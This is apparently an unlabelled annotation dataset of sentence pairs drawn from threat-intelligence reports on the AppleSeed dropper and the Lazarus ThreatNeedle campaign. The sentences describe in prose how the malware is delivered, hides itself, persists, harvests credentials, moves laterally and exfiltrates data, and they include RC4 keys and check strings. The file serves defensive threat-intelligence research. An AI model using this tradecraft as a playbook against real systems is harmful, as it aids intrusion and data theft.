        "S2": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S0<=>S3",
        "S1": "The actor has distributed its dropper embedded in an archive file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.zip) as an attachment through spearphishing emails.",
        "S2": "The archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S4<=>S6",
        "S1": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).",
        "S2": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S4<=>S7",
        "S1": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).",
        "S2": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S5<=>S7",
        "S1": "At first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload.",
        "S2": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S6<=>S8",
        "S1": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "S2": "At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S13<=>S15",
        "S1": "Whenever in the code the malware needs to use a string, it takes the encrypted string and passes it into two functions to decrypt it.",
        "S2": "The second function \"string_decryptor\" gets the created data structure in the previous function and then decrypts the string and puts it in the same data structure.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S16<=>S19",
        "S1": "The decryptor function first convert the input string in hex ascii format to binary by calling the hexascii_to_binary function on each two ascii characters (i.e. c3, 42, b1, 1d... in example 1).",
        "S2": "Most of the important API calls resolve dynamically during the run time using \"string_decryptor\" function.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S21<=>S23",
        "S1": "The AppleSeed payload has an export function named \"DllRegisterServer\" which will be called when the DLL is executed using RegSvr32.exe.",
        "S2": "Copy itself into \"C:\\ProgramData\\Software\\ESTsoft\\Common\" and rename itself as ESTCommon.dll to pretend it is a DLL that belongs to ESTsecurity company.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S25<=>S28",
        "S1": "Make itself persistent by creating the following registry key:",
        "S2": "In the next step it creates a Mutex to make sure it only infects a victim once.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S32<=>S40",
        "S1": "After sending the data to the server, the data is deleted from the victim's machine.",
        "S2": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S32<=>S38",
        "S1": "After sending the data to the server, the data is deleted from the victim's machine.",
        "S2": "The keylogger function uses GetKeyState and GetKeyboardState to capture the pressed keys on the victim's machine and logs all keys per process into the log.txt file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S33<=>S36",
        "S1": "The ApppleSeed payload is using RC4 for encryption and decryption of the data.",
        "S2": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S34<=>S36",
        "S1": "To generate RC4 key, it creates a Random buffer of 117 bytes by Calling CryptGenRandom and then uses CryptCreateHash and CryptHashData to adds the buffer into a MD5 hash object.",
        "S2": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S35<=>S37",
        "S1": "Then it calls CryptDeriveKey to generate the RC4 key.",
        "S2": "The RSA key is in hex ASCII format and has been decrypted using \"string_decryptor\" function.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md::S40<=>S42",
        "S1": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "S2": "This thread looks for txt, ppt, hwp, pdf, and doc files in the Desktop, Documents, Downloads and AppData\\Local\\Microsoft\\Windows\\INetCache\\IE directories and archives them to be ready to be exfiltrated to the server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S1<=>S33",
        "S1": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "S2": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S1<=>S106",
        "S1": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "S2": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S1<=>S4",
        "S1": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "S2": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S2<=>S8",
        "S1": "Email addresses in those departments received phishing emails that either had a malicious Word document attached or a link to one hosted on a remote server.",
        "S2": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S4<=>S6",
        "S1": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "S2": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S5<=>S7",
        "S1": "The attackers registered accounts with a public email service, making sure the sender\u2019s email addresses looked similar to the medical center\u2019s real email address.",
        "S2": "The attackers were able to find this information on the medical center\u2019s public website.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S6<=>S97",
        "S1": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "S2": "Among the compromised machines were those used by the administrators of the enterprise\u2019s IT infrastructure.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S6<=>S17",
        "S1": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "S2": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S7<=>S9",
        "S1": "The attackers were able to find this information on the medical center\u2019s public website.",
        "S2": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S8<=>S12",
        "S1": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "S2": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S9<=>S13",
        "S1": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "S2": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S10<=>S99",
        "S1": "The content of the lure document was copied from an online post by a health clinic.",
        "S2": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S11<=>S22",
        "S1": "Our investigation showed that the initial spear-phishing attempt was unsuccessful due to macros being disabled in the Microsoft Office installation of the targeted systems.",
        "S2": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S12<=>S63",
        "S1": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.",
        "S2": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S13<=>S47",
        "S1": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "S2": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S13<=>S31",
        "S1": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "S2": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S15<=>S17",
        "S1": "The content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020, did not contain any grammatical mistakes.",
        "S2": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S17<=>S19",
        "S1": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "S2": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S18<=>S34",
        "S1": "This group also utilized different types of spear-phishing attack.",
        "S2": "We attribute this malware family to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S19<=>S78",
        "S1": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "S2": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S19<=>S23",
        "S1": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "S2": "A few days later, the same host opened a different malicious document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S22<=>S25",
        "S1": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "S2": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S25<=>S32",
        "S1": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "S2": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S25<=>S33",
        "S1": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "S2": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S26<=>S37",
        "S1": "It creates a payload and shortcut file and then continues executing the payload by using the following command line parameters.",
        "S2": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S31<=>S37",
        "S1": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "S2": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S32<=>S36",
        "S1": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "S2": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S33<=>S36",
        "S1": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "S2": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S33<=>S113",
        "S1": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "S2": "Hardcoded proxy address in the malware",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S35<=>S47",
        "S1": "We previously observed the Lazarus group utilizing this cluster when attacking cryptocurrency businesses and a mobile game company.",
        "S2": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S36<=>S80",
        "S1": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "S2": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S36<=>S41",
        "S1": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "S2": "This installer is responsible for implanting the next stage loader-type malware and registering it for auto-execution in order to achieve persistence.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S36<=>S92",
        "S1": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "S2": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S37<=>S42",
        "S1": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "S2": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S37<=>S63",
        "S1": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "S2": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S40<=>S42",
        "S1": "When moving laterally, the actor uses ThreatNeedle installer-type malware in the process.",
        "S2": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S42<=>S49",
        "S1": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "S2": "This final payload is the ThreatNeedle loader running in memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S43<=>S48",
        "S1": "Upon launch, the malware decrypts an embedded string using RC4 (key: B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to \u201c7486513879852\u201c.",
        "S2": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S46<=>S48",
        "S1": "The malware then creates a file named bcdbootinfo.tlp in the system folder containing the infection time and the random service name that is chosen.",
        "S2": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S47<=>S78",
        "S1": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "S2": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S48<=>S50",
        "S1": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "S2": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S49<=>S53",
        "S1": "This final payload is the ThreatNeedle loader running in memory.",
        "S2": "This component is responsible for loading the final backdoor payload into memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S49<=>S61",
        "S1": "This final payload is the ThreatNeedle loader running in memory.",
        "S2": "This is a common trait in ThreatNeedle loaders.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S50<=>S78",
        "S1": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "S2": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S51<=>S54",
        "S1": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "S2": "In order to do this, the malware uses several techniques to decrypt its payload:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S51<=>S56",
        "S1": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "S2": "- Loading the payload from itself after decrypting RC4 and decompression.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S51<=>S67",
        "S1": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "S2": "As we can see from the installer malware description, we suspect that the registry key was created by the installer component.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S54<=>S56",
        "S1": "In order to do this, the malware uses several techniques to decrypt its payload:",
        "S2": "- Loading the payload from itself after decrypting RC4 and decompression.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S55<=>S66",
        "S1": "- Loading the payload from the registry.",
        "S2": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S59<=>S62",
        "S1": "- Loading the payload from itself after one-byte XORing.",
        "S2": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S62<=>S68",
        "S1": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "S2": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S62<=>S65",
        "S1": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "S2": "Eventually, the ThreatNeedle malware spawns in memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S63<=>S65",
        "S1": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "S2": "Eventually, the ThreatNeedle malware spawns in memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S65<=>S70",
        "S1": "Eventually, the ThreatNeedle malware spawns in memory.",
        "S2": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S66<=>S68",
        "S1": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "S2": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S66<=>S79",
        "S1": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "S2": "Lazarus overcame network segmentation, exfiltrating data from a completely isolated network segment cut off from the internet by compromising a router virtual machine, as we explain below under \u201cOvercoming network segmentation\u201c.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S68<=>S96",
        "S1": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "S2": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S70<=>S80",
        "S1": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "S2": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S78<=>S83",
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S78<=>S80",
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S78<=>S89",
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "Typical lateral movement methods were employed, using Windows commands.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S78<=>S84",
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S80<=>S122",
        "S1": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "S2": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S80<=>S82",
        "S1": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "S2": "Below is a rough timeline of the compromise we investigated:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S80<=>S84",
        "S1": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "S2": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S83<=>S87",
        "S1": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "S2": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S84<=>S111",
        "S1": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "S2": "New connection layout after attacker\u2019s intrusion",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S84<=>S86",
        "S1": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "S2": "Several days later, the attacker started to move laterally originating from this host.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S87<=>S92",
        "S1": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.",
        "S2": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S88<=>S91",
        "S1": "After acquiring the login credentials, the actor started to move laterally from workstations to server hosts.",
        "S2": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S91<=>S118",
        "S1": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).",
        "S2": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S92<=>S96",
        "S1": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "S2": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S92<=>S112",
        "S1": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "S2": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S93<=>S96",
        "S1": "The enterprise network under attack was divided into two segments: corporate (a network on which computers had internet access) and restricted (a network on which computers hosted sensitive data and had no internet access).",
        "S2": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S95<=>S98",
        "S1": "In other words, the two segments were meant to be completely separated.",
        "S2": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S96<=>S99",
        "S1": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "S2": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S98<=>S101",
        "S1": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "S2": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S98<=>S100",
        "S1": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "S2": "However, since directly routing traffic between the segments was not possible, the attackers couldn\u2019t use their standard malware set to exfiltrate data from the restricted segment to the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S101<=>S106",
        "S1": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "S2": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S101<=>S103",
        "S1": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "S2": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S101<=>S105",
        "S1": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "S2": "It\u2019s unknown how the attackers were able to obtain the credentials for that account, but it\u2019s possible the credentials were saved in one of the infected system\u2019s browser password managers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S103<=>S106",
        "S1": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "S2": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S107<=>S109",
        "S1": "Several days after that, on July 10, 2020, the attackers connected to the router via SSH and set up the PuTTy PSCP (the PuTTY Secure Copy client) utility on one of the infected machines.",
        "S2": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S108<=>S123",
        "S1": "This utility was used to upload malware to the router VM.",
        "S2": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S108<=>S116",
        "S1": "This utility was used to upload malware to the router VM.",
        "S2": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S109<=>S111",
        "S1": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "S2": "New connection layout after attacker\u2019s intrusion",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S110<=>S116",
        "S1": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "S2": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S110<=>S114",
        "S1": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "S2": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S111<=>S114",
        "S1": "New connection layout after attacker\u2019s intrusion",
        "S2": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S112<=>S118",
        "S1": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.",
        "S2": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "relation": ""
